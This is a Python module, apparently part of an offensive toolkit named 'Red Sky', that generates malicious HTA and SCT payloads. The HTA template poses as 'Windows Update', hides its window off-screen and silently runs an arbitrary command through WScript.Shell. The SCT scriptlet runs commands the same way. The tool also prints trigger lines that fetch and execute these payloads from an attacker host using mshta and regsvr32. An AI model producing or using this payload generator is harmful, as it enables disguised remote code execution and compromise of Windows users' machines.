# language: Python, file: Program/payload/hta.py, target: Red Sky payload — HTA
# Generate HTA + SCT payloads for mshta delivery.

import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


HTA_TEMPLATE = '''<html>
<head>
<title>Update</title>
<HTA:APPLICATION ID="RedSky"
    APPLICATIONNAME="Windows Update"
    WINDOWSTATE="minimize"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    BORDER="none"
    INNERBORDER="no"
    SCROLL="no"
    CAPTION="no"
/>
<script language="JScript">
window.resizeTo(0, 0);
window.moveTo(-1000, -1000);
var sh = new ActiveXObject("WScript.Shell");
sh.Run("cmd.exe /c {payload}", 0, false);
window.close();
</script>
</head>
<body></body>
</html>
'''


SCT_TEMPLATE = '''<?XML version="1.0"?>
<scriptlet>
<registration
    progid="RedSky"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
</registration>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("{payload}", 0, false);
]]>
</script>
</scriptlet>
'''


def cmd_gen(kind: str, payload: str, out_file: str = "") -> int:
    kind = kind.lower()

    if kind == "hta":
        result = HTA_TEMPLATE.format(payload=payload)
        ext = ".hta"
        trigger = "mshta https://attacker.tld/payload.hta"
    elif kind == "sct":
        result = SCT_TEMPLATE.format(payload=payload)
        ext = ".sct"
        trigger = "regsvr32 /s /n /u /i:https://attacker.tld/payload.sct scrobj.dll"
    else:
        print_err(f"unknown kind: {kind}")
        print_info("available: hta | sct")
        return 2

    print_info(f"generated {kind} payload")
    print()
    print(result)
    print()
    print_info("trigger with:")
    print(f"  {ASH}{trigger}{RESET}")

    if out_file:
        out = Path(out_file)
    else:
        out = OUTPUT_DIR / "payload" / f"payload{ext}"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(result)
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    if len(args) < 2:
        print_err("usage: redsky payload hta <hta|sct> <command> [out_file]")
        return 2
    return cmd_gen(args[0], args[1], args[2] if len(args) > 2 else "")


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
